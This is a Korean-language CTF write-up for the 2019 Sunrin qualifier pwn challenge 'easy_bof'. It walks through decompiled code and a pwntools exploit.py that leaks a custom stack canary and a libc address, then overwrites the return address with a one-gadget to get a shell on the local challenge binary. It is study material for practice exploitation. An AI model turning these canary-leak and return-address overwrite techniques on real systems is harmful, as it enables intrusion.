---
title: "2019 선린 고등해커 예선 easy_bof"
date: 2020-1-10
tags: [Sunrin]
categories: [Sunrin]
---

64비트 바이너리고 stripped 돼있다.

```
so_ezpz: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.32, BuildID[sha1]=a533875a3669dbcc27f8121185aaf3171b136021, stripped
```

보호기법은 다 걸려있다.

```
[*] '/vagrant/ctfs/so_ezpz'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

메인은 이렇게 되어있는데 stripped돼서 심볼이 없어서 불편했다. do while로 계속 실행해준다.

`sub_C33` : 세팅해주는 함수

`sub_B00` : 카나리 설정

`sub_D30` : 메뉴 출력

`sub_D67` : 메뉴 기능들 

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  const char *v3; // rdi
  char v5; // [rsp+0h] [rbp-110h]
  __int64 v6; // [rsp+108h] [rbp-8h]

  sub_C33();
  sub_B00(&v6);
  puts("This is warming up! :)");
  v3 = "So ezpzezpz ~~~~~\n";
  puts("So ezpzezpz ~~~~~\n");
  do
  {
    sub_D30(v3);
    v3 = &v5;
  }
  while ( (unsigned int)sub_D67(&v5) );
  return 0LL;
}
```

`sub_C33` 함수는 `/dev/urandom` 으로 8바이트 뽑아와서 0x707070707070707이랑 xor한 후  `qword_2020E8` 에 Canary로 저장해둔다. 뭐 세팅 해주는 함수인 거 같다. 

```c
__int64 sub_C33()
{
  int fd; // ST0C_4
  __int64 result; // rax

  fd = open("/dev/urandom", 0);
  read(fd, &qword_2020E8, 8uLL);
  fflush(stdin);
  fflush(stdout);
  fflush(stderr);
  setvbuf(stdin, 0LL, 1, 0LL);
  setvbuf(stdout, 0LL, 1, 0LL);
  setvbuf(stderr, 0LL, 1, 0LL);
  qword_2020D8 = (__int64)sub_B2C;
  qword_2020E0 = (__int64)sub_BFB;
  result = qword_2020E8 ^ 0x707070707070707LL;
  qword_2020E8 ^= 0x707070707070707uLL;
  return result;
}
```

여기는 메뉴 기능들 있는 곳이다. 

`sub_BCA` 함수는 입력받고 atoi함수 호출 후 리턴해주는 함수다. 그냥 메뉴 입력받는 곳.

`qword_2020D0[v2](a1, v2)` 여기서 함수 호출해준다. 

```c
int __fastcall sub_D67(__int64 a1)
{
  int result; // eax
  unsigned int v2; // [rsp+1Ch] [rbp-4h]

  v2 = sub_BCA();
  if ( v2 > 2 )
    return puts("no no ... :(");
  if ( v2 )
  {
    qword_2020D0[v2](a1, v2);
    result = -1;
  }
  else
  {
    puts("Bye~~");
    result = 0;
  }
  return result;
}
```

익스는 간단하다. 

1번 메뉴에서 범위를 자기가 512까지 지정할 수 있다. Buf를 Canary 위치 전까지 덮고 Write해서 카나리를 가져오면 된다.

그리고 Buf를 280만큼 덮고 write해주면 `__libc_start_main+240` 주소가 나온다. 

![](https://user-images.githubusercontent.com/32904385/72091386-651e2d00-3353-11ea-9f7d-5ee6640096a9.png)

이제 그냥 Canary 맞춰주고 oneshot 날려주면 된다.

> exploit.py

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
e = ELF('./so_ezpz')
p = process('./so_ezpz')
libc = e.libc
sla = lambda x,y : p.sendlineafter(x,y)
sa = lambda x,y : p.sendafter(x,y)
sl = lambda x : p.sendline(x)
s = lambda x : p.send(x)

sla('>','1')
sla('?','264')
s('A'*264)
sla('>','2')
p.recvuntil('A'*264)
canary = u64(p.recv(8))
log.info('Canary : ' + hex(canary))

sla('>','1')
payload = 'A'*264
payload += p64(canary)
payload += 'B'*8
sla('?',str(len(payload)))
s(payload)
# raw_input()

sla('>','2')
p.recvuntil(payload)

libc_base = u64(p.recv(6) + '\x00\x00') - (libc.symbols['__libc_start_main'] + 240)
log.info('libc_base : ' + hex(libc_base))

sla('>','1')
payload2 = 'A'*264
payload2 += p64(canary)
payload2 += 'A'*8
payload2 += p64(libc_base + 0x45216)
sla('?',str(len(payload2)))
sl(payload2)

p.interactive()
```

